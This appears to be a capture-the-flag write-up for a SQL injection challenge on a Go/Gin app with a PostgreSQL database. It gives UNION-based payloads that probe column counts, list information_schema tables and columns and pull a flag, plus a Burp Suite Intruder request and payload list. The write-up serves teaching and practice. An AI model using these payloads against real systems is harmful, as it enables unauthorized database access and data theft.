# Possible Hints
1. App was written in Golang. Utilizes Gin-Gonic, "github.com/lib/pq" and "database/sql"
2. Database is Postgresql
3. Identify the vulnerable field and assess the return object based on field types 
4. Understanding the potential of SQLi is easy. Golang is a statically typed language; meaning the "receiver" object is static and does nto work with dynamic fields. So if "receiver" expects object TEST{string, bool}, the returning rows from db should be {string, bool}.
5. Exploit is possible with example payload ```/juice/5'§UNION SELECT '1','b'§;--``` (need to be url encoded)

# Solution

This is a fairly easy challenge with a twist of having a statiucally typed language at backend. Meaning that not only understanding the DB behind but also understanding ho API fetches from DB and crafts a response is crucial.

Some steps has been implemented to block SQLMap from directly solving the challenge

Example approach to solve:
1. Random payloads for understanding SQL statement escape. Example successful payload:

    ```/juice/5'UNION SELECT '1','b';-- ```

2. Testing for number of return fields for UNION SELECT in an automatic manner:

    ```
        UNION SELECT null;--
        UNION SELECT null,null;--
        UNION SELECT null,null,null;--
    ```
3. On the second try, there should be 200 response. Learning these, TABLE NAMES can be retrieved from DB:

    ``` UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema='public' ```

4. After getting the table-of-interest here, schema for table-of-interest can be retrieved:

    ``` UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='super_secret_table' ```

5. A final payload can be crafted using the fields and with regards to response object (field numbers and datatypes)

    ``` UNION SELECT 1,flag FROM super_secret_table ```


## BurpSuite Intruder Instructions
Request Data (change HOST and other data):

```
    GET /juice/5'§§;-- HTTP/1.1
    Host: localhost:8080
    sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96"
    sec-ch-ua-mobile: ?0
    sec-ch-ua-platform: "Linux"
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Sec-Fetch-Site: none
    Sec-Fetch-Mode: navigate
    Sec-Fetch-User: ?1
    Sec-Fetch-Dest: document
    Accept-Encoding: gzip, deflate
    Accept-Language: en-US,en;q=0.9
    Connection: close

```

Intruder Payload List

```
    UNION SELECT null;--
    UNION SELECT null,null;--
    UNION SELECT null,null,null;--
    UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema='public'
    UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='super_secret_table'
    UNION SELECT 1,flag FROM super_secret_table
```